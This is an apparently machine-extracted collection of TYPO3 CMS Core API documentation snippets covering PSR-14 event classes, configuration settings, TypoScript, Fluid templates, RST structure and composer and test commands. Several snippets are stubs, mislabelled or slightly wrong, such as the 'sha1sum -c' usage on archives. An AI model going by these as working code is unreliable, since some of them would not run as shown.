setIntegrityStatusCodes(array $integrityStatusCodes): void;\n}\n```\n\n----------------------------------------\n\nTITLE: Describing a Stateless Service\nDESCRIPTION: The code snippet demonstrates how the FlexFormTools service has been refactored in TYPO3 v13 to be stateless. It is designed as a shared, readonly service with dependencies managed via dependency injection, focusing specifically on API methods without storing any data properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/Services.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Configuration\\FlexForm\\FlexFormTools\n```\n\n----------------------------------------\n\nTITLE: Implementing getTable Method in PHP\nDESCRIPTION: This method retrieves the table name for the RecordList.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_8\n\nLANGUAGE: PHP\nCODE:\n```\npublic function getTable(): string\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Deleted File in TYPO3 AfterFileDeletedEvent in PHP\nDESCRIPTION: This method retrieves the file that was deleted. It returns a FileInterface object that can be used by event listeners to access properties of the deleted file for cleanup operations or custom handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileDeletedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ngetFile()\n:returns: `\\TYPO3\\CMS\\Core\\Resource\\FileInterface`\n```\n\n----------------------------------------\n\nTITLE: Configuring Specific TYPO3 Service in PHP\nDESCRIPTION: Example of configuring a specific TYPO3 service using TYPO3_CONF_VARS global configuration array. Shows how to set a configuration value for a specific service instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/ServiceConfiguration.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['tx_example_sv1']['foo'] = 'bar';\n```\n\n----------------------------------------\n\nTITLE: Getting the Local File Path in TYPO3 BeforeFileReplacedEvent Class in PHP\nDESCRIPTION: Method to retrieve the local file path of the file that will replace the existing file. This allows listeners to analyze the content of the new file before replacement.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFileReplacedEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\npublic function getLocalFilePath(): string\n```\n\n----------------------------------------\n\nTITLE: Defining BeforePageIsRetrievedEvent Class in PHP\nDESCRIPTION: This snippet defines the BeforePageIsRetrievedEvent class with various methods for manipulating page retrieval. It includes methods for getting and setting the page, page ID, controlling group access checks, and accessing the context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforePageIsRetrievedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Domain\\Event;\n\nclass BeforePageIsRetrievedEvent\n{\n    public function getPage(): ?\\TYPO3\\CMS\\Core\\Domain\\Page\n    {\n        // Implementation not shown\n    }\n\n    public function setPage(\\TYPO3\\CMS\\Core\\Domain\\Page $page): void\n    {\n        // Implementation not shown\n    }\n\n    public function hasPage(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getPageId(): int\n    {\n        // Implementation not shown\n    }\n\n    public function setPageId(int $pageId): void\n    {\n        // Implementation not shown\n    }\n\n    public function skipGroupAccessCheck(): void\n    {\n        // Implementation not shown\n    }\n\n    public function respectGroupAccessCheck(): void\n    {\n        // Implementation not shown\n    }\n\n    public function isGroupAccessCheckSkipped(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getContext(): \\TYPO3\\CMS\\Core\\Context\\Context\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Command User Interaction with SymfonyStyle\nDESCRIPTION: Implementing interactive user feedback and input collection in console commands using the SymfonyStyle interface for messages, confirmations, and selections.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n// Print messages\n$io->title('Creating a new wizard');\n$io->section('Configuration');\n\n// Get input if not provided\nif (!$wizardName) {\n    $wizardName = $io->ask('Please enter a wizard name', 'Merlin');\n}\n\n// Ask for confirmation\nif (!$io->confirm('Do you want to create a wizard named \"' . $wizardName . '\"?', true)) {\n    $io->warning('Cancelled wizard creation');\n    return Command::SUCCESS;\n}\n\n// Select from choices\n$wizardType = $io->choice(\n    'Please select the type of wizard',\n    ['White Wizard', 'Black Wizard', 'Illusionist'],\n    'White Wizard'\n);\n\n// Success message\n$io->success(\n    'Created a new ' . $wizardType . ' named ' . $wizardName\n    . ($isBoring ? ' (boring)' : '')\n);\n```\n\n----------------------------------------\n\nTITLE: Enabling Insecure Frame Option in TYPO3 ShowImageController\nDESCRIPTION: Configures whether the show image controller is allowed to supply an unsecured '&frame' URI parameter for backwards compatibility. It is disabled by default for security reasons.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['features']['security.frontend.allowInsecureFrameOptionInShowImageController'] = true;\n```\n\n----------------------------------------\n\nTITLE: Initializing Basic Cache Configuration in TYPO3\nDESCRIPTION: Basic cache registration in ext_localconf.php using null coalescing assignment to allow administrator overrides.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Developer/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['myext_mycache'] ??= [];\n```\n\n----------------------------------------\n\nTITLE: Using User Functions\nDESCRIPTION: Explains how to incorporate user functions within extension configuration. It involves defining the path to a ViewHelper class's render method. The example demonstrates defining a user function and assigning a default value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtConfTemplate.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\n\"# cat=basic/enable/050; type=user[Vendor\\\\MyExtensionKey\\\\ViewHelpers\\\\MyConfigurationClass->render]; label=MyLabel\\nmyVariable = 1\"\n```\n\n----------------------------------------\n\nTITLE: Bash Script for PHPUnit Test Execution\nDESCRIPTION: Simple bash script to install Composer dependencies and run PHPUnit tests with a specific configuration. Can be shared across development environments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/TestRunners.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n#!/bin/bash\ncomposer install && php vendor/bin/phpunit -c Build/phpunit/UnitTests.xml\n```\n\n----------------------------------------\n\nTITLE: Creating a Fluid Template Link for New Haiku in TYPO3 CMS\nDESCRIPTION: This snippet demonstrates how to create a link in a Fluid template to generate a new spring haiku. It uses TYPO3 CMS ViewHelpers for icon rendering and translation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/_UriBuilder/_CreateHaikuLink.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<html data-namespace-typo3-fluid=\"true\"\n      xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\"\n      xmlns:core=\"http://typo3.org/ns/TYPO3/CMS/Core/ViewHelpers\"\n>\n   <a href=\"{createHaikuLink}\">\n      <core:icon identifier=\"actions-document-new\"/>\n      <f:translate key=\"function_links_new_spring_haiku\"/>\n   </a>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeHistoryRollbackStartEvent Class Namespace and Methods\nDESCRIPTION: PHP class definition for BeforeHistoryRollbackStartEvent with method declarations for handling history rollback operations. The class provides methods to access rollback details, field changes, and user authentication.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforeHistoryRollbackStartEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\History\\Event;\n\nclass BeforeHistoryRollbackStartEvent {\n    public function getRecordHistoryRollback(): \\TYPO3\\CMS\\Backend\\History\\RecordHistoryRollback\n    public function getRollbackFields(): string\n    public function getDiff(): array\n    public function getBackendUserAuthentication(): ?\\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Meta Tag Fallbacks in TYPO3 TypoScript\nDESCRIPTION: This TypoScript snippet sets fallback values for the description and og:description meta tags using page properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Configuration/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\npage {\n  meta {\n    description = {$page.meta.description}\n    description.override.field = description\n    og:description = {$page.meta.description}\n    og:description.override.field = og_description\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of Flattened TypoScript Settings Array in TYPO3 CMS\nDESCRIPTION: Illustrates the structure of a flattened TypoScript settings array as returned by the getFlatSettings() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/FrontendTypoScript.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nmySettings {\n    foo = fooValue\n    bar = barValue\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating deprecated tableoptions to defaultTableOptions in TYPO3\nDESCRIPTION: This snippet shows how to migrate deprecated `tableoptions` to `defaultTableOptions` configuration in TYPO3. It changes `collate` to `collation`. This example shows the required changes in `settings.php` or `additional.php`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/DB.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n 'Connections' => [\n     'Default' => [\n-        'tableoptions' => [\n+        'defaultTableOptions' => [\n-            'collate' => 'utf8mb4_unicode_ci',\n+            'collation' => 'utf8mb4_unicode_ci',\n      ],\n    ],\n  ],\n```\n\n----------------------------------------\n\nTITLE: Setting Template Root Paths - TYPO3 PHP\nDESCRIPTION: This snippet specifies the paths where the template files for templated emails are located. It outlines the expected default values for these paths.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['templateRootPaths'] = [\n    0 => 'EXT:core/Resources/Private/Templates/Email/',\n    10 => 'EXT:backend/Resources/Private/Templates/Email/',\n];\n```\n\n----------------------------------------\n\nTITLE: Rendering CSV Data with TYPO3 Fluid Template\nDESCRIPTION: A Fluid template that displays CSV data in a table format. It includes debug output of the processed data and renders a dynamic table based on the number of columns specified in {data.imagecols}. The table rows are generated from the 'myTable' variable with column separators defined in {data.tx_examples_separator}.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/CustomContentElements/DataProcCsv.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html data-namespace-typo3-fluid=\"true\" xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\">\n   <h2>Data in variable \"myTable\"</h2>\n   <f:debug inline=\"true\">{myTable}</f:debug>\n\n   <h2>Output, {data.imagecols} columns separated by char {data.tx_examples_separator}</h2>\n   <table class=\"table table-hover\">\n      <f:for each=\"{myTable}\" as=\"columns\" iteration=\"i\">\n         <tr>\n            <th scope=\"row\">{i.cycle}</th>\n            <f:for as=\"column\" each=\"{columns}\">\n               <td>{column}</td>\n            </f:for>\n         <tr>\n      </f:for>\n   </table>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Hash Verification Commands\nDESCRIPTION: Shell commands for generating and verifying SHA256, SHA1, and MD5 hashes of TYPO3 release packages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/ReleaseIntegrity.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nshasum -a 256 typo3_src-*.tar.gz typo3_src-*.zip\n```\n\nLANGUAGE: bash\nCODE:\n```\nsha1sum -c typo3_src-*.tar.gz typo3_src-*.zip\n```\n\nLANGUAGE: bash\nCODE:\n```\nmd5sum typo3_src-*.tar.gz typo3_src-*.zip\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeImportEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the BeforeImportEvent class in the TYPO3\\CMS\\Impexp\\Event namespace. It includes properties for the import object and import parameters, along with getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Impexp/BeforeImportEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforeImportEvent\n{\n    private ImportExportController $importObject;\n    private array $importParameters;\n\n    public function __construct(ImportExportController $importObject, array $importParameters)\n    {\n        $this->importObject = $importObject;\n        $this->importParameters = $importParameters;\n    }\n\n    public function getImportObject(): ImportExportController\n    {\n        return $this->importObject;\n    }\n\n    public function getImportParameters(): array\n    {\n        return $this->importParameters;\n    }\n\n    public function setImportParameters(array $importParameters): void\n    {\n        $this->importParameters = $importParameters;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFolderMovedEvent Class in PHP for TYPO3 CMS Core Resource\nDESCRIPTION: This snippet defines the AfterFolderMovedEvent class with three methods: getFolder(), getTargetParentFolder(), and getTargetFolder(). These methods return information about the moved folder and its new location.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFolderMovedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFolderMovedEvent\n{\n    public function getFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Implementation not shown\n    }\n\n    public function getTargetParentFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Implementation not shown\n    }\n\n    public function getTargetFolder(): ?\\TYPO3\\CMS\\Core\\Resource\\FolderInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Document Structure for TYPO3 Core Package Events\nDESCRIPTION: RST format documentation structure defining the index and table of contents for TYPO3 core package events documentation. Includes directives for incorporating shared includes and setting up the documentation hierarchy.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Package/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Package\n..  _eventlist-core-package:\n\n\n=======\nPackage\n=======\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Package.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Removing Merged TYPO3 Packages Before Upgrading\nDESCRIPTION: Commands to remove packages that have been merged into other packages in newer TYPO3 versions. Specifically, typo3/cms-recordlist (merged in v12) and typo3/cms-t3editor (merged in v13).\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/UpgradeCore.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncomposer remove \"typo3/cms-recordlist\"\ncomposer remove \"typo3/cms-t3editor\"\n```\n\n----------------------------------------\n\nTITLE: RST Table of Contents for Service Configuration\nDESCRIPTION: RST toctree directive defining the structure of service configuration documentation sections.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. toctree::\n   :titlesonly:\n\n   RegistrationChanges\n   ServiceConfiguration\n   ServiceTypeConfiguration\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for MFA Configuration Screenshot\nDESCRIPTION: ReStructuredText directive that includes and formats a screenshot of the MFA providers configuration module. The image is styled with a shadow effect.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Authentication/MfaConfigurationModule.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Authentication/MfaConfigurationModule.png\n   :class: with-shadow\n\n   MFA providers in the configuration module\n```\n\n----------------------------------------\n\nTITLE: Including reStructuredText directives for Filelist events documentation\nDESCRIPTION: Set of reStructuredText directives that include common definitions, create an index entry for Events and Filelist, define a reference anchor, and create a title and table of contents for the Filelist events documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Filelist/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Filelist\n..  _eventlist-filelist:\n\n\n========\nFilelist\n========\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:filelist.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: TypoScript Counter Configuration with Current\nDESCRIPTION: Shows how to configure TypoScript to use the current value passed from Fluid.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_4\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.myCounter = TEXT\nlib.myCounter {\n  current = 1\n  wrap = <strong>|</strong>\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up RST documentation structure for TYPO3 Core Events\nDESCRIPTION: This RST code defines the structure for documenting PSR-14 events in the TYPO3 Core extension. It includes necessary imports, sets up indexing, and creates a table of contents that will automatically include all event documentation pages in the directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Core/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Core\n..  _eventlist-core-core:\n\n\n====\nCore\n====\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Core.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Setting up reST Document Structure for Domain Events in TYPO3 Core\nDESCRIPTION: This reST (reStructuredText) snippet defines the document structure for the Domain events documentation page in TYPO3 Core API. It includes necessary imports, sets up indexing, and creates a toctree for navigating to individual event documentation pages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Domain/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Domain\n..  _eventlist-core-domain:\n\n\n============\nDomain\n============\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Domain.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: YAML News Plugin Routing Configuration\nDESCRIPTION: Example configuration showing fallback value handling for news plugin routes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n_NewsPlugin.yaml\n```\n\n----------------------------------------\n\nTITLE: Checking Service Availability in TYPO3\nDESCRIPTION: Example showing how to implement availability checks for services based on system requirements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/Implementing.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n'available' => function_exists('curl_exec'),\n```\n\n----------------------------------------\n\nTITLE: Configuring Editor-Only Backend Lock in TYPO3\nDESCRIPTION: PHP configuration to lock the TYPO3 backend for editors while maintaining access for administrators and CLI operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/MaintenanceMode/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// Lock the backend for editors while admins and CLI are still allowed\n$GLOBALS['TYPO3_CONF_VARS']['BE']['adminOnly'] = 2;\n```\n\n----------------------------------------\n\nTITLE: Creating Modal with Static Backdrop in TYPO3\nDESCRIPTION: Shows how to create a modal with a static backdrop to prevent closing when clicking outside, requiring explicit button interaction.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Modals.rst#2025-04-16_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nTYPO3.Modal.confirm(\n  'The title of the modal',\n  'This the the body of the modal',\n  TYPO3.Severity.info,\n  [],\n  true // Static backdrop\n);\n```\n\n----------------------------------------\n\nTITLE: Creating RST Reference Label for File Mounts Submodule\nDESCRIPTION: This RST directive creates a reference label for the File Mounts submodule section in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: rst\nCODE:\n```\n..  _user-management-backend-users-file-mounts:\n```\n\n----------------------------------------\n\nTITLE: Setting Language Fallback in TYPO3 Configuration\nDESCRIPTION: PHP configuration to define language fallbacks for a custom language in TYPO3. This example sets gsw_CH to fall back to de_AT, then to de.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['localization']['locales']['dependencies'] = [\n    'gsw_CH' => ['de_AT', 'de'],\n];\n```\n\n----------------------------------------\n\nTITLE: Running Tests with Specific PHP Version using runTests.sh\nDESCRIPTION: Command to run unit tests with a specific PHP version using the runTests.sh script. This allows testing compatibility with different PHP versions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nBuild/Script/runTests.sh -s unit -p 8.2\n```\n\n----------------------------------------\n\nTITLE: Extension Configuration Schema for TYPO3 Hooks\nDESCRIPTION: Example schema for defining hooks in the $GLOBALS['TYPO3_CONF_VARS']['EXTCONF'] configuration space, which is used for third-party extension configuration including hooks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Hooks/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['<extension_key>']['<sub_key>'][<index>] = <value>\n```\n\n----------------------------------------\n\nTITLE: Updating Specific TYPO3 Extensions with Composer\nDESCRIPTION: Command to update specific TYPO3 extensions using Composer. This example updates the 'news' and 'typo3-console' packages while maintaining other dependencies at their locked versions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/VersionControl.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncomposer update georgringer/news helhum/typo3-console\n```\n\n----------------------------------------\n\nTITLE: Defining IsTableExcludedFromReferenceIndexEvent Class in PHP\nDESCRIPTION: This code snippet defines the IsTableExcludedFromReferenceIndexEvent class in TYPO3 CMS. It includes properties for the table name and exclusion status, along with getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/DataHandling/IsTableExcludedFromReferenceIndexEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class IsTableExcludedFromReferenceIndexEvent\n{\n    private string $tableName;\n    private bool $excluded = false;\n\n    public function __construct(string $tableName)\n    {\n        $this->tableName = $tableName;\n    }\n\n    public function getTableName(): string\n    {\n        return $this->tableName;\n    }\n\n    public function isExcluded(): bool\n    {\n        return $this->excluded;\n    }\n\n    public function setExcluded(bool $excluded): void\n    {\n        $this->excluded = $excluded;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: BeforeTransformTextForPersistenceEvent Class Definition - PHP\nDESCRIPTION: PHP class definition for handling RTE HTML content transformation events. Provides methods to get and set HTML content, retrieve initial content state, and access processing configuration before persistence.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Html/BeforeTransformTextForPersistenceEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Html\\Event;\n\nclass BeforeTransformTextForPersistenceEvent {\n    public function getHtmlContent(): string\n    public function setHtmlContent(string $htmlContent)\n    public function getInitialHtmlContent(): string\n    public function getProcessingConfiguration(): array\n}\n```\n\n----------------------------------------\n\nTITLE: RST Figure Directive for TYPO3 Admin Creation Screenshot\nDESCRIPTION: RST markup for displaying a screenshot showing the button to create an administrator user in TYPO3 CMS backend, including alt text and styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/BackendUsers/CreateAdministrator.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/BackendUsers/CreateAdministrator.png\n   :alt: Button to create an administrator\n   :class: with-shadow\n\n   Create a new administrative user\n```\n\n----------------------------------------\n\nTITLE: Configuring Select Field in TYPO3 User Settings\nDESCRIPTION: A PHP code snippet demonstrating how to configure a select type field in TYPO3 user settings. It includes a function to process items for selection and a localized label. This requires a valid TYPO3 setup and the appropriate TYPO3 CMS modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/UserSettingsConfiguration/Columns.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'startModule' => [\n   'type' => 'select',\n   'itemsProcFunc' => 'TYPO3\\\\CMS\\\\Setup\\\\Controller\\\\SetupModuleController->renderStartModuleSelect',\n   'label' => 'LLL:EXT:setup/mod/locallang.xlf:startModule',\n]\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Cache Manager in PHP\nDESCRIPTION: Refers to the CacheManager class in TYPO3, which was previously used to retrieve FrontendInterface objects. It is now recommended to use dependency injection instead of directly using CacheManager.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Architecture/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Cache\\CacheManager\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyClearCacheActionsEvent Class in PHP for TYPO3 CMS Backend\nDESCRIPTION: This code snippet defines the ModifyClearCacheActionsEvent class with methods to manipulate cache actions. It includes methods to add and set cache actions, retrieve cache actions, add and set cache action identifiers, and retrieve cache action identifiers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyClearCacheActionsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Backend\\Event;\n\nclass ModifyClearCacheActionsEvent\n{\n    public function addCacheAction(array $cacheAction)\n    {\n        // Implementation not shown\n    }\n\n    public function setCacheActions(array $cacheActions)\n    {\n        // Implementation not shown\n    }\n\n    public function getCacheActions(): array\n    {\n        // Implementation not shown\n    }\n\n    public function addCacheActionIdentifier(string $cacheActionIdentifier)\n    {\n        // Implementation not shown\n    }\n\n    public function setCacheActionIdentifiers(array $cacheActionIdentifiers)\n    {\n        // Implementation not shown\n    }\n\n    public function getCacheActionIdentifiers(): array\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Field Control Class in TYPO3\nDESCRIPTION: This snippet shows the 